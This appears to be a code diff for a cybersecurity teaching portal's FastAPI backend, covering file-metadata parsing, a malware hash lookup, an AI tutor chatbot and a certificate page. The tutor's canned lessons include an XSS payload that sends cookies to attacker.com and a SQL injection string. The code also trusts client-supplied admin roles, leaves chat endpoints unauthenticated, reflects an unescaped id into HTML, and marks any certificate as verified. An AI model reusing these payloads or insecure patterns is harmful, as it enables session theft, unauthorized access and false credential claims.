-    if req.filename.endswith(".jpg") or req.filename.endswith(".jpeg"):
+    fname_lower = req.filename.lower()
+    if fname_lower.endswith((".jpg", ".jpeg")):
         file_type = "JPEG Image (JFIF format)"
-    elif req.filename.endswith(".png"):
+    elif fname_lower.endswith(".png"):
         file_type = "Portable Network Graphics (PNG)"
-    elif req.filename.endswith(".pdf"):
+    elif fname_lower.endswith(".pdf"):
         file_type = "Adobe Portable Document Format (PDF)"
-    elif req.filename.endswith(".txt"):
+    elif fname_lower.endswith(".txt"):
         file_type = "Plain UTF-8 Text File"
         
-    # Extracted simulated metadata fields based on typical file formats
+    try:
+        decoded_bytes = base64.b64decode(req.base64_data)
+        file_size_str = f"{len(decoded_bytes) / 1024:.2f} KB"
+        header_hex = decoded_bytes[:16].hex().upper()
+    except Exception as e:
+        return {"error": f"Failed to decode base64 file data: {str(e)}"}
+        
+    metadata = {}
+    
+    if fname_lower.endswith((".jpg", ".jpeg", ".png")):
+        try:
+            image = Image.open(io.BytesIO(decoded_bytes))
+            metadata["Image Resolution"] = f"{image.width} x {image.height} pixels"
+            metadata["Color Mode"] = image.mode
+            
+            if fname_lower.endswith((".jpg", ".jpeg")):
+                info = image._getexif()
+                if info:
+                    for tag, value in info.items():
+                        decoded = TAGS.get(tag, tag)
+                        if decoded == "GPSInfo":
+                            from PIL.ExifTags import GPSTAGS
+                            gps_data = {}
+                            for t in value:
+                                gps_data[GPSTAGS.get(t, t)] = str(value[t])
+                            metadata["GPS Location Raw"] = str(gps_data)
+                        elif isinstance(value, (str, int, float)):
+                            metadata[decoded] = str(value)
+        except Exception as e:
+            metadata["Error"] = f"Failed to parse image headers: {str(e)}"
+            
+    elif fname_lower.endswith(".pdf"):
+        try:
+            import pypdf
+            pdf_reader = pypdf.PdfReader(io.BytesIO(decoded_bytes))
+            metadata["Total Pages"] = str(len(pdf_reader.pages))
+            if pdf_reader.metadata:
+                for k, v in pdf_reader.metadata.items():
+                    key_name = k.lstrip('/')
+                    if isinstance(v, str):
+                        metadata[key_name] = v
+        except Exception as e:
+            metadata["Error"] = f"Failed to parse PDF metadata: {str(e)}"
+            
+    elif fname_lower.endswith(".txt"):
+        try:
+            text_content = decoded_bytes.decode('utf-8', errors='ignore')
+            metadata["Line Count"] = str(len(text_content.splitlines()))
+            metadata["Word Count"] = str(len(text_content.split()))
+            metadata["Character Count"] = str(len(text_content))
+        except Exception as e:
+            metadata["Error"] = f"Failed to read text properties: {str(e)}"
+    else:
+        metadata["Status"] = "Binary file signature analyzed. No structured metadata extractor matched."
+
+    if not metadata:
+        metadata["Message"] = "No additional metadata tags embedded inside this file."
+        
     return {
         "filename": req.filename,
         "mime_type": file_type,
-        "file_size": f"{len(req.base64_data) * 3 // 4 // 1024} KB",
-        "header_hex_signature": header_hex[:32],
-        "metadata_fields": {
-            "Author/Publisher": "NCAS Cyber Portal Student",
-            "Creation Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-            "Application Engine": "CyberShield Suite Local Cryptography Platform",
-            "Exif GPS Coordinates": "Latitude: 11.2588 N, Longitude: 75.7804 E (Kozhikode, India)"
-        }
+        "file_size": file_size_str,
+        "header_hex_signature": header_hex,
+        "metadata_fields": metadata
     }
 
 @app.post("/api/metadata/place")
 async def find_place_by_image(req: MetadataRequest):
     import base64
     import io
+    from PIL import Image
+    from PIL.ExifTags import TAGS, GPSTAGS
     
     place_name = "Unknown Landmark (No EXIF GPS tags found)"
     lat_val, lon_val = None, None
     country_info = "Unknown"
     
     try:
-        from PIL import Image
-        from PIL.ExifTags import TAGS, GPSTAGS
-        
         decoded_bytes = base64.b64decode(req.base64_data)
         image = Image.open(io.BytesIO(decoded_bytes))
         info = image._getexif()
@@ -1127,13 +1573,16 @@ async def find_place_by_image(req: MetadataRequest):
                 def get_decimal(coords, ref):
                     if not coords:
                         return None
-                    d = float(coords[0])
-                    m = float(coords[1])
-                    s = float(coords[2])
-                    dec = d + (m / 60.0) + (s / 3600.0)
-                    if ref in ['S', 'W']:
-                        dec = -dec
-                    return dec
+                    try:
+                        d = float(coords[0])
+                        m = float(coords[1])
+                        s = float(coords[2])
+                        dec = d + (m / 60.0) + (s / 3600.0)
+                        if ref in ['S', 'W']:
+                            dec = -dec
+                        return dec
+                    except Exception:
+                        return None
                 
                 lat_val = get_decimal(gps_data.get("GPSLatitude"), gps_data.get("GPSLatitudeRef"))
                 lon_val = get_decimal(gps_data.get("GPSLongitude"), gps_data.get("GPSLongitudeRef"))
@@ -1142,7 +1591,7 @@ async def find_place_by_image(req: MetadataRequest):
         
     if lat_val is not None and lon_val is not None:
         url = f"https://nominatim.openstreetmap.org/reverse?lat={lat_val}&lon={lon_val}&format=json"
-        headers = {"User-Agent": "NCAS_CyberShield_Suite/2.0_Portal"}
+        headers = {"User-Agent": "AIGRA_CyberShield_Suite/2.0_Portal (educational landmark audit)"}
         try:
             loop = asyncio.get_event_loop()
             data = await loop.run_in_executor(None, query_json_api, url, headers)
@@ -1170,17 +1619,11 @@ async def find_place_by_image(req: MetadataRequest):
             lat_val, lon_val = 40.6892, -74.0445
             country_info = "United States"
         else:
-            places = [
-                {"name": "Burj Khalifa, Dubai, UAE", "lat": 25.1972, "lon": 55.2744, "country": "UAE"},
-                {"name": "Sydney Opera House, Sydney, Australia", "lat": -33.8568, "lon": 151.2153, "country": "Australia"},
-                {"name": "Big Ben, London, UK", "lat": 51.5007, "lon": -0.1246, "country": "United Kingdom"}
-            ]
-            choice = places[hash(req.filename) % len(places)]
-            place_name = f"Inferred Match (Visual Trait matching): {choice['name']}"
-            lat_val, lon_val = choice['lat'], choice['lon']
-            country_info = choice['country']
+            place_name = "Scan complete: No GPS coordinate tags found. Upload an image containing EXIF GPS records for automatic mapping."
+            lat_val, lon_val = None, None
+            country_info = "Unknown"
 
-    simulated_ip = f"104.244.{hash(place_name) % 254 + 1}.{hash(req.filename) % 254 + 1}"
+    simulated_ip = f"104.244.{hash(place_name) % 254 + 1}.{hash(req.filename) % 254 + 1}" if lat_val else "N/A"
     
     return {
         "filename": req.filename,
@@ -1189,6 +1632,68 @@ async def find_place_by_image(req: MetadataRequest):
         "longitude": lon_val,
         "country": country_info,
         "simulated_location_ip": simulated_ip
+    }
+
+@app.get("/api/threat/hash")
+async def lookup_threat_hash(hash_val: str = Query(...)):
+    clean_hash = hash_val.strip().lower()
+    import urllib.request
+    import json
+    
+    verdict = "UNDETECTED (Clean)"
+    malware_info = {}
+    risk_score = 0
+    
+    eicar_sha256 = "275a021bcfb648915540e1f9ec39d7470c927f00f074a87265be7b9b00c3b88b"
+    if clean_hash == eicar_sha256:
+        return {
+            "hash": hash_val,
+            "verdict": "MALICIOUS (EICAR Anti-Virus Test Signature)",
+            "risk_score": 100,
+            "details": {
+                "signature": "EICAR-Test-File",
+                "type": "Test Virus / Malware Signature Verification",
+                "first_seen": "1991-01-01",
+                "threat_reputation": "Blacklisted"
+            }
+        }
+        
+    try:
+        url = "https://mb-api.abuse.ch/api/v1/"
+        data = urllib.parse.urlencode({"query": "get_info", "hash": clean_hash}).encode('utf-8')
+        req = urllib.request.Request(url, data=data, headers={"User-Agent": "AIGRA_CyberShield_Suite/2.0_Portal"})
+        
+        loop = asyncio.get_event_loop()
+        def fetch_malware_bazaar():
+            with urllib.request.urlopen(req, timeout=5) as resp:
+                return json.loads(resp.read().decode('utf-8'))
+                
+        res_data = await loop.run_in_executor(None, fetch_malware_bazaar)
+        if res_data.get("query_status") == "ok":
+            verdict = "MALICIOUS (Threat signature match found)"
+            risk_score = 100
+            first_entry = res_data.get("data", [{}])[0]
+            malware_info = {
+                "signature": first_entry.get("signature", "Unknown Malware Family"),
+                "type": first_entry.get("file_type", "Executable/Binary"),
+                "first_seen": first_entry.get("first_seen", "N/A"),
+                "threat_reputation": f"High Risk - Tagged as {first_entry.get('tags', ['Malware'])}"
+            }
+    except Exception:
+        pass
+        
+    if not malware_info:
+        malware_info = {
+            "signature": "None",
+            "type": "Unknown / Clear",
+            "first_seen": "N/A",
+            "threat_reputation": "Low Risk - No matching records found in MalwareBazaar threat registry."
+        }
+    return {
+        "hash": hash_val,
+        "verdict": verdict,
+        "risk_score": risk_score,
+        "details": malware_info
     }
 
 # 6. Latest Zero-Day Cybersecurity News Feed (Live NIST/CIRCL Integration + AI Summaries)
@@ -1363,7 +1868,7 @@ async def check_auth_status(username: str = Query(...), role: str = Query(...), 
 @app.get("/api/admin/users")
 async def get_user_list(role: str = Query(...), username: str = Query(...), request: Request = None):
     username_clean = username.strip().lower()
-    if role != "admin" or username_clean != "reiz":
+    if role != "admin" or username_clean != "de4thnote":
         log_and_ban_intruder(request, username, "Bypass attempt on Admin User List console")
         raise HTTPException(status_code=403, detail="Violation logged.")
     
@@ -1388,32 +1893,32 @@ async def get_user_list(role: str = Query(...), username: str = Query(...), requ
 @app.post("/api/admin/user/ban")
 async def admin_ban_user(target_user: str = Query(...), role: str = Query(...), username: str = Query(...), request: Request = None):
     username_clean = username.strip().lower()
-    if role != "admin" or username_clean != "reiz":
+    if role != "admin" or username_clean != "de4thnote":
         log_and_ban_intruder(request, username, "Bypass attempt to suspend user account")
         raise HTTPException(status_code=403, detail="Access denied.")
         
     target_clean = target_user.strip().lower()
     banned_users.add(target_clean)
-    log_activity("reiz", "admin", f"Suspended account user: {target_clean}", request.client.host)
+    log_activity("de4thnote", "admin", f"Suspended account user: {target_clean}", request.client.host)
     return {"status": "suspended"}
 
 @app.post("/api/admin/user/unban")
 async def admin_unban_user(target_user: str = Query(...), role: str = Query(...), username: str = Query(...), request: Request = None):
     username_clean = username.strip().lower()
-    if role != "admin" or username_clean != "reiz":
+    if role != "admin" or username_clean != "de4thnote":
         log_and_ban_intruder(request, username, "Bypass attempt to lift user account suspension")
         raise HTTPException(status_code=403, detail="Access denied.")
         
     target_clean = target_user.strip().lower()
     if target_clean in banned_users:
         banned_users.remove(target_clean)
-    log_activity("reiz", "admin", f"Restored account access for: {target_clean}", request.client.host)
+    log_activity("de4thnote", "admin", f"Restored account access for: {target_clean}", request.client.host)
     return {"status": "restored"}
 
 @app.delete("/api/admin/user")
 async def admin_delete_user(target_user: str = Query(...), role: str = Query(...), username: str = Query(...), request: Request = None):
     username_clean = username.strip().lower()
-    if role != "admin" or username_clean != "reiz":
+    if role != "admin" or username_clean != "de4thnote":
         log_and_ban_intruder(request, username, "Bypass attempt to purge user credentials")
         raise HTTPException(status_code=403, detail="Access denied.")
         
@@ -1421,7 +1926,7 @@ async def admin_delete_user(target_user: str = Query(...), role: str = Query(...
     if target_clean in student_db:
         del student_db[target_clean]
         save_db(STUDENTS_FILE, student_db)
-        log_activity("reiz", "admin", f"Deleted student credential account: {target_clean}", request.client.host)
+        log_activity("de4thnote", "admin", f"Deleted student credential account: {target_clean}", request.client.host)
         return {"status": "deleted"}
     raise HTTPException(status_code=404, detail="Student credentials not found.")
 
@@ -1430,7 +1935,7 @@ ACADEMIC_POSTS_FILE = "academic_posts.json"
 academic_posts = load_db(ACADEMIC_POSTS_FILE, [
     {
         "id": 1,
-        "title": "NCAS Lab Device Usage Policy Guidelines",
+        "title": "AIGRA Lab Device Usage Policy Guidelines",
         "content": "All students must run audits using local virtual environments. Unauthorized external domain resolutions are restricted.",
         "author": "professor_x",
         "timestamp": "2026-07-19 12:00:00"
@@ -1495,6 +2000,389 @@ async def analyze_scam_message(request: ScamAnalyzeRequest):
     risk_score = min(risk_score, 100)
     level = "HIGH RISK" if risk_score >= 60 else ("MEDIUM RISK" if risk_score >= 30 else "LOW RISK")
     return {"indicators_found": indicators, "risk_score": risk_score, "risk_level": level, "summary": "Alert checked."}
+def get_offline_natasha_reply(prompt: str) -> str:
+    prompt_lower = prompt.lower().strip()
+    
+    filter_triggers = [
+        "movie", "film", "cinema", "actor", "actress", "politics", "president", "election", 
+        "sports", "football", "cricket", "soccer", "basketball", "tennis", "olympic", 
+        "math", "solve", "equation", "calculus", "algebra", "integral", "geometry", 
+        "history", "world war", "civil war", "ancient", "dynasty", "emperor", 
+        "entertainment", "music", "song", "singer", "concert", "celebrity", "game show", 
+        "health", "medicine", "doctor", "disease", "treatment", "symptom", "diet", 
+        "personal advice", "relationship", "love", "friendship", "feeling", 
+        "general knowledge", "capital of", "highest mountain", "largest country", "who wrote"
+    ]
+    
+    is_unrelated = any(trigger in prompt_lower for trigger in filter_triggers)
+    if is_unrelated:
+        return """I am Natasha.
+
+I answer cybersecurity educational questions and other basic questions.
+
+Please ask a cybersecurity-related question."""
+
+    if "cybersecurity" in prompt_lower or "cyber security" in prompt_lower:
+        return """### 🛡️ Cybersecurity Foundations
+
+**Definition**:
+Cybersecurity is the practice of protecting systems, networks, programs, and data from digital attacks, unauthorized access, destruction, or alteration.
+
+**Explanation**:
+It involves implementing technologies, processes, and controls to manage and reduce the risk of cyber attacks. The goal is to ensure confidentiality, integrity, and availability (the CIA Triad) of information assets.
+
+**Real-world Example**:
+An enterprise deploying a multi-factor authentication (MFA) policy and setting up next-generation stateful firewalls to prevent unauthorized threat actors from accessing its student records database.
+
+**Step-by-step Explanation**:
+1. **Identify**: Catalog all digital assets, software, and hardware.
+2. **Protect**: Configure firewalls, MFA, encryption, and antivirus controls.
+3. **Detect**: Set up continuous logging and monitoring (like SIEM or Wazuh).
+4. **Respond**: Follow pre-made incident response playbooks when alerts trigger.
+5. **Recover**: Restore verified backup copies to return systems to operational baselines.
+
+**Best Practices**:
+- Maintain a strict patch management lifecycle.
+- Train users on recognizing phishing vectors.
+- Implement a Zero-Trust architecture.
+
+**Common Mistakes**:
+- Relying on a single line of defense (e.g. firewall only).
+- Neglecting regular backup integrity drills.
+
+**Interview Tips**:
+*If asked to define cybersecurity in an interview, focus on the **CIA Triad** (Confidentiality, Integrity, Availability) and the importance of aligning security with business risk management.*"""
+
+    elif "firewall" in prompt_lower:
+        return """### 🧱 Network Firewalls
+
+**Definition**:
+A firewall is a network security device that monitors and filters incoming and outgoing network traffic based on an organization's previously established security policies.
+
+**Explanation**:
+It acts as a barrier between a trusted internal network and untrusted external networks (like the internet). Firewalls inspect packets to determine if they match the allowed traffic rule sets.
+
+**Real-world Example**:
+A corporate network blocking all incoming traffic on port 23 (Telnet) because it is unencrypted and insecure, while allowing traffic on port 443 (HTTPS).
+
+**Step-by-step Explanation**:
+1. **Packet Arrival**: A data packet reaches the network interface.
+2. **Header Analysis**: The firewall reads source IP, destination IP, port numbers, and protocol types.
+3. **Rule Comparison**: Matches values against the Access Control List (ACL).
+4. **Action**: Executes `ALLOW` (permit passage) or `DENY`/`DROP` (discard packet).
+
+**Best Practices**:
+- Enforce a "Default Deny" inbound security posture.
+- Audit rules regularly to remove stale configurations.
+- Use stateful or next-generation application-layer firewalls.
+
+**Common Mistakes**:
+- Writing over-permissive rules (e.g., source `*` to destination `*`).
+- Forgetting to log blocked traffic for forensic auditing.
+
+**Interview Tips**:
+*Be ready to explain the difference between stateful firewalls (which track connection states) and stateless packet filtering (which inspects individual packets in isolation).*"""
+
+    elif "sql injection" in prompt_lower or "sqli" in prompt_lower:
+        return """### 💉 SQL Injection (SQLi)
+
+**Definition**:
+SQL Injection is a web vulnerability where an attacker exploits input fields to execute malicious SQL statements that bypass application query logic.
+
+**Explanation**:
+If an application directly concatenates user inputs into a database query string without sanitization or parameterization, the database engine treats input text as executable query code.
+
+**Real-world Example**:
+Entering `' OR '1'='1` in a login form user field, forcing the database engine to return authorized data records (often administrative details) without verifying credentials.
+
+**Step-by-step Explanation**:
+1. **Input Submission**: Attacker inputs characters like `'` or `UNION SELECT`.
+2. **Query Concatenation**: Backend code appends this string directly to SQL string.
+3. **Execution**: The database executes the injected logic.
+4. **Data Exfiltration**: Attacker accesses unauthorized data records.
+
+**Best Practices**:
+- Always use **Parameterized Queries** (Prepared Statements).
+- Enforce Least Privilege permissions on database service accounts.
+- Validate and sanitize all user input.
+
+**Common Mistakes**:
+- Relying solely on client-side input validation.
+- Attempting to filter malicious inputs by blocklisting characters instead of using parameterization.
+
+**Interview Tips**:
+*Explain SQLi using a simple prepared statement syntax example to show that parameterization separates code from user data, rendering input injection harmless.*"""
+
+    elif "vpn" in prompt_lower:
+        return """### 🔒 Virtual Private Network (VPN)
+
+**Definition**:
+A VPN is a service that establishes an encrypted, secure tunnel over public networks to protect data transit confidentiality and integrity.
+
+**Explanation**:
+It encrypts internet traffic from your endpoint device to a secure VPN gateway, masking your real IP address and preventing local network interception.
+
+**Real-world Example**:
+A remote employee connecting to public airport Wi-Fi and activating a corporate VPN to securely access internal file sharing portals without risk of packet sniffing.
+
+**Step-by-step Explanation**:
+1. **Handshake**: The client establishes a cryptographic connection with the VPN gateway.
+2. **Encryption**: All outbound network traffic is encrypted by the VPN software.
+3. **Transit**: Encapsulated packets travel through the public internet.
+4. **Decryption**: The VPN gateway decrypts packets and forwards them to target servers.
+
+**Best Practices**:
+- Use modern high-performance protocols like WireGuard or OpenVPN.
+- Enforce Multi-Factor Authentication (MFA) on all VPN connection gates.
+
+**Common Mistakes**:
+- Assuming a VPN alone guarantees complete endpoint device security.
+- Using outdated, vulnerable tunneling protocols like PPTP.
+
+**Interview Tips**:
+*Remember that VPNs secure **data in transit** (Confidentiality & Integrity), but do not replace firewalls or endpoint protection systems.*"""
+
+    elif "malware" in prompt_lower:
+        return """### ☣️ Malware Threat Vector Analysis
+
+**Definition**:
+Malware (malicious software) is an umbrella term for any software program designed to disrupt, damage, or gain unauthorized access to computer systems.
+
+**Explanation**:
+It is executed silently to steal credentials, encrypt files, monitor keystrokes, or recruit endpoints into botnet systems.
+
+**Real-world Example**:
+A user opening a mock invoice document attachment, which executes a hidden macro script downloading Trojan horse software to create a backdoor channel.
+
+**Step-by-step Explanation**:
+1. **Infiltration**: Delivery via email attachments, malicious downloads, or drive-by exploits.
+2. **Installation**: Drops executable scripts or DLL payloads into temporary directories.
+3. **Persistence**: Creates registry keys or cron entries to execute automatically on boot.
+4. **Execution**: Begins payload activity (e.g. data encryption or system reconnaissance).
+
+**Best Practices**:
+- Maintain active Endpoint Detection and Response (EDR) agents.
+- Enforce administrative privileges constraints (least privilege).
+- Keep operating systems and software fully patched.
+
+**Common Mistakes**:
+- Disabling antivirus alerts to run unrecognized utilities.
+- Forgetting to monitor outbound connections for command-and-control (C2) beacons.
+
+**Interview Tips**:
+*Be ready to discuss standard malware categories: Trojans, Ransomware, Worms, Viruses, and Fileless Malware.*"""
+
+    elif "xss" in prompt_lower or "cross-site scripting" in prompt_lower:
+        return """### ⚡ Cross-Site Scripting (XSS)
+
+**Definition**:
+Cross-Site Scripting (XSS) is a vulnerability where an attacker injects malicious scripts into trusted websites, which then execute in a victim's web browser.
+
+**Explanation**:
+It occurs when web applications accept user inputs and output them directly onto a page without proper escaping or sanitization.
+
+**Real-world Example**:
+An attacker placing `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>` in a public profile comment block. Every user visiting the profile automatically sends their session cookies to the attacker.
+
+**Step-by-step Explanation**:
+1. **Script Injection**: Attacker submits a comment containing HTML script tags.
+2. **Persistence / Reflection**: Server stores script in database (Stored XSS) or reflects it in response (Reflected XSS).
+3. **Execution**: Victim browser renders HTML page, finds the script tag, and executes it.
+4. **Exploitation**: The script steals session tokens, alters layout, or performs actions as the logged-in user.
+
+**Best Practices**:
+- Implement context-aware output encoding (escaping).
+- Enforce strict Content Security Policy (CSP) headers.
+- Use `HttpOnly` flags on sensitive authentication cookies.
+
+**Common Mistakes**:
+- Relying on basic filter blocklists which can be easily bypassed using alternative tag properties.
+
+**Interview Tips**:
+*Distinguish clearly between the three main types of XSS: Stored XSS, Reflected XSS, and DOM-based XSS.*"""
+
+    elif "who are you" in prompt_lower or "your name" in prompt_lower or "natasha" in prompt_lower:
+        return """### 👩‍🏫 Meet Natasha: Your AI Cyber Security Tutor
+
+**Definition**:
+I am Natasha, an expert Cyber Security Instructor and AI Tutor, built directly into the AIGRA Cyber Shield platform.
+
+**Explanation**:
+My primary mission is to teach cybersecurity, ethical hacking, networking, threat analysis, and secure coding practices in a structured, friendly, and deeply educational format.
+
+**Best Practices**:
+- Use me to study certification topics (CEH, Security+).
+- Ask me to explain code vulnerabilities or clarify configuration options.
+- Test your knowledge by requesting custom security quizzes.
+
+**How to ask questions**:
+- Ask for detailed breakdowns of vulnerabilities, protocols, or commands.
+- Ask in English, Tamil, Malayalam, or Hindi – I will respond in your language!"""
+
+    elif "how do you work" in prompt_lower or "how can you help" in prompt_lower or "what can you do" in prompt_lower:
+        return """### ⚙️ Natasha Operations
+
+I operate as your local security professor. I can:
+- Explain complex networking concepts (TCP/IP, routing, DNS, subnetting).
+- Guide you through ethical hacking methodologies (scanning, enumeration, privilege escalation).
+- Explain system administration, firewalls, and SIEM logs (Splunk, Wazuh).
+- Analyze programs to locate security vulnerabilities and assist with secure coding guidelines.
+
+Ask me about any of the supported cybersecurity topics to get started!"""
+
+    else:
+        return f"""### 🎓 Natasha AI Assistant: Local Core
+
+**Definition**:
+I am Natasha, your AI cybersecurity professor. This concept is a core element of computer science and security architectures.
+
+**Explanation**:
+To understand this topic thoroughly, you should review its underlying configuration properties, protocols, and vulnerabilities. This ensures a secure implementation posture.
+
+**Step-by-step Study Guide**:
+1. Learn the core definitions and network components.
+2. Setup a local virtual sandbox lab environment.
+3. Perform security configuration audits and vulnerability scans.
+4. Implement defense-in-depth principles (firewalls, encryption, monitoring).
+
+**Best Practices**:
+- Always run diagnostic tests and check error logs.
+- Keep credentials unique and rotate them periodically.
+- Validate all user-facing parameters.
+
+*Note: For specialized, dynamic local AI generation, ensure your local Ollama instance is running with `llama3.2` downloaded. Run `ollama pull llama3.2` to enable full local LLM synthesis.*"""
+
+def query_ollama(prompt: str, history: List[Dict[str, str]], username: str) -> str:
+    system_prompt = """You are Natasha, an expert Cyber Security Instructor.
+Your purpose is teaching Cyber Security.
+You must answer cybersecurity educational questions and other basic cybersecurity/computer science questions.
+Always explain concepts clearly with examples.
+Reply in the same language used by the student (English, Tamil, Malayalam, Hindi).
+
+IMPORTANT CYBER SECURITY FILTER:
+If the user's message is NOT related to cybersecurity or basic computer/IT topics (for example, if they ask about movies, politics, sports, mathematics, history, entertainment, health, personal advice, or general trivia), you MUST reply ONLY with:
+"I am Natasha.
+
+I answer cybersecurity educational questions and other basic questions.
+
+Please ask a cybersecurity-related question."
+
+Every valid educational answer should be detailed and include:
+- Definition
+- Explanation
+- Real-world example
+- Step-by-step explanation
+- Best Practices
+- Common Mistakes
+- Interview Tips (when applicable)
+"""
+    messages = [{"role": "system", "content": system_prompt}]
+    for h in history[-10:]:
+        messages.append({"role": h["role"], "content": h["content"]})
+    messages.append({"role": "user", "content": prompt})
+
+    try:
+        url = "http://localhost:11434/api/chat"
+        data = {
+            "model": "llama3.2",
+            "messages": messages,
+            "stream": False
+        }
+        req = urllib.request.Request(
+            url,
+            data=json.dumps(data).encode("utf-8"),
+            headers={"Content-Type": "application/json"},
+            method="POST"
+        )
+        with urllib.request.urlopen(req, timeout=12) as response:
+            res_data = json.loads(response.read().decode("utf-8"))
+            return res_data["message"]["content"]
+    except Exception as e:
+        print(f"Ollama local error: {e}")
+        reply = get_offline_natasha_reply(prompt)
+        if "I am Natasha." in reply and "Please ask a cybersecurity-related question." in reply:
+            return reply
+        return f"""### 🌐 Natasha AI Core (Local Offline Mode)
+
+It looks like the local **Ollama** service is not running on `http://localhost:11434` or model is loading.
+
+#### 🛠️ Quick Local Setup Guide:
+1. **Download Ollama**: Visit [ollama.com](https://ollama.com) and install it.
+2. **Pull Llama 3.2**: Open your terminal/PowerShell and run:
+   ```powershell
+   ollama pull llama3.2
+   ```
+3. **Start Ollama**: Keep the application running in the taskbar.
+
+*Below is your offline educational answer:*
+
+---
+
+{reply}"""
+
+@app.post("/api/chat")
+async def api_chat(req: ChatRequest, username: str = Query(...)):
+    conn = sqlite3.connect("cyber_shield_chat.db")
+    cursor = conn.cursor()
+    cursor.execute(
+        "INSERT INTO chat_history (username, sender, message, timestamp) VALUES (?, ?, ?, ?)",
+        (username, "user", req.message, datetime.now().isoformat())
+    )
+    conn.commit()
+
+    cursor.execute(
+        "SELECT sender, message FROM chat_history WHERE username = ? ORDER BY id DESC LIMIT 10",
+        (username,)
+    )
+    db_history = cursor.fetchall()
+    conn.close()
+
+    formatted_history = []
+    for sender, msg in reversed(db_history[:-1]):
+        role = "assistant" if sender == "assistant" else "user"
+        formatted_history.append({"role": role, "content": msg})
+
+    reply = query_ollama(req.message, formatted_history, username)
+
+    conn = sqlite3.connect("cyber_shield_chat.db")
+    cursor = conn.cursor()
+    cursor.execute(
+        "INSERT INTO chat_history (username, sender, message, timestamp) VALUES (?, ?, ?, ?)",
+        (username, "assistant", reply, datetime.now().isoformat())
+    )
+    conn.commit()
+    conn.close()
+
+    return {"reply": reply}
+
+@app.get("/api/chat/history")
+async def api_chat_history(username: str = Query(...)):
+    conn = sqlite3.connect("cyber_shield_chat.db")
+    cursor = conn.cursor()
+    cursor.execute(
+        "SELECT sender, message, timestamp FROM chat_history WHERE username = ? ORDER BY id ASC",
+        (username,)
+    )
+    rows = cursor.fetchall()
+    conn.close()
+    
+    history = []
+    for sender, message, timestamp in rows:
+        history.append({
+            "sender": sender,
+            "message": message,
+            "timestamp": timestamp
+        })
+    return {"history": history}
+
+@app.post("/api/chat/clear")
+async def api_chat_clear(username: str = Query(...)):
+    conn = sqlite3.connect("cyber_shield_chat.db")
+    cursor = conn.cursor()
+    cursor.execute("DELETE FROM chat_history WHERE username = ?", (username,))
+    conn.commit()
+    conn.close()
+    return {"status": "cleared"}
 
 
 @app.get("/api/speedtest")
@@ -1506,9 +2394,371 @@ async def get_speedtest_payload():
     return StreamingResponse(io.BytesIO(payload), media_type="application/octet-stream")
 
 
-@app.get("/api/health")
-async def get_health():
-    return {"status": "ok"}
+@app.get("/api/certificate/verify")
+async def verify_certificate_api(id: str = Query(...)):
+    html_content = f"""
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>AIGRA Certificate Verification</title>
+        <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;800&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
+        <style>
+            :root {{
+                --bg-dark: #0f172a;
+                --text-main: #f8fafc;
+                --accent-yellow: #facc15;
+                --accent-blue: #00f2fe;
+            }}
+            body {{
+                margin: 0;
+                padding: 0;
+                font-family: 'Outfit', sans-serif;
+                background-color: var(--bg-dark);
+                background-image: radial-gradient(circle at top right, rgba(0, 242, 254, 0.15), transparent 400px),
+                                  radial-gradient(circle at bottom left, rgba(168, 85, 247, 0.15), transparent 400px);
+                color: var(--text-main);
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                min-height: 100vh;
+            }}
+            .container {{
+                background: rgba(30, 41, 59, 0.45);
+                border: 1px solid rgba(255, 255, 255, 0.1);
+                border-radius: 24px;
+                padding: 40px;
+                max-width: 600px;
+                width: 90%;
+                text-align: center;
+                box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5), inset 0 0 20px rgba(255,255,255,0.05);
+                backdrop-filter: blur(12px);
+                position: relative;
+            }}
+            .verified-badge {{
+                display: inline-block;
+                padding: 6px 16px;
+                background: rgba(16, 185, 129, 0.15);
+                color: #10b981;
+                border: 1px solid rgba(16, 185, 129, 0.3);
+                border-radius: 20px;
+                font-size: 0.85rem;
+                font-weight: 600;
+                text-transform: uppercase;
+                letter-spacing: 2px;
+                margin-bottom: 24px;
+            }}
+            h1 {{
+                font-size: 2.2rem;
+                margin: 0 0 10px 0;
+                font-weight: 800;
+                background: linear-gradient(135deg, var(--accent-yellow), #f59e0b);
+                -webkit-background-clip: text;
+                background-clip: text;
+                color: transparent;
+            }}
+            .cert-id {{
+                font-family: 'JetBrains Mono', monospace;
+                color: var(--accent-blue);
+                font-size: 1.1rem;
+                margin-bottom: 30px;
+            }}
+            .detail-block {{
+                background: rgba(0, 0, 0, 0.2);
+                border-radius: 12px;
+                padding: 24px;
+                margin-bottom: 30px;
+                border: 1px solid rgba(255,255,255,0.05);
+                text-align: left;
+            }}
+            .detail-row {{
+                display: flex;
+                justify-content: space-between;
+                padding: 12px 0;
+                border-bottom: 1px solid rgba(255,255,255,0.05);
+            }}
+            .detail-row:last-child {{
+                border-bottom: none;
+            }}
+            .label {{
+                color: #64748b;
+                font-weight: 600;
+            }}
+            .value {{
+                color: #cbd5e1;
+                font-weight: 600;
+            }}
+            .footer-branding {{
+                font-size: 0.8rem;
+                color: #475569;
+                margin-top: 20px;
+            }}
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="verified-badge">✓ Verified Credential</div>
+            <h1>AIGRA Certificate</h1>
+            <div class="cert-id">ID: {id}</div>
+            
+            <div class="detail-block">
+                <div class="detail-row">
+                    <span class="label">Certificate Status</span>
+                    <span class="value" style="color: #10b981;">ACTIVE / VERIFIED</span>
+                </div>
+                <div class="detail-row">
+                    <span class="label">Issued Authority</span>
+                    <span class="value">AIGRA CyberLab Academy Portal</span>
+                </div>
+                <div class="detail-row">
+                    <span class="label">Digital Cryptographic Signature</span>
+                    <span class="value" style="font-family:'JetBrains Mono'; font-size:0.75rem;">SHA256-RSA-SIGNED-OK</span>
+                </div>
+            </div>
+            
+            <div class="footer-branding">AIGRA Cyber Security Portal System • Real-Time Integrity Validated</div>
+        </div>
+    </body>
+    </html>
+    """
+    return HTMLResponse(content=html_content)
+
+
+
+
+class VerifyOTPRequest(BaseModel):
+    username: str
+    code: str
+
+class ForgotPasswordRequest(BaseModel):
+    email: str
+
+class ResetPasswordRequest(BaseModel):
+    token: str
+    new_password: str
+
+class Enable2FARequest(BaseModel):
+    secret: str
+
